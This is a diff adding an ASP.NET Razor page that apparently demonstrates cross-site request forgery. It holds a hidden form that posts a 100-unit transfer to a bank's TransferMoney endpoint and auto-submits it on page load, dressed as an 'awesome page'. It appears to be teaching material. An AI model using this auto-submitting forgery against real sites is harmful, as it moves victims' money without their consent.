@@ -1,0 +1,19 @@
+﻿@{
+    ViewBag.Title = "PostForgeryPage";
+    var bankUrl = System.Web.Configuration.WebConfigurationManager.AppSettings["GoodUrl"] + "/Bank/TransferMoney";
+}
+
+<h2>Look at this awesome page!</h2>
+
+<form id="mint" action="@bankUrl" method="post">
+    <button type="submit">Give to the poor mob boss</button>
+    <input type="hidden" name="from" value="srkirkland" />
+    <input type="hidden" name="to" value="tsoprano" />
+    <input type="hidden" name="amount" value="100" />
+</form>
+
+<script>
+    $(function () {
+        $("#mint").submit();
+    });
+</script>
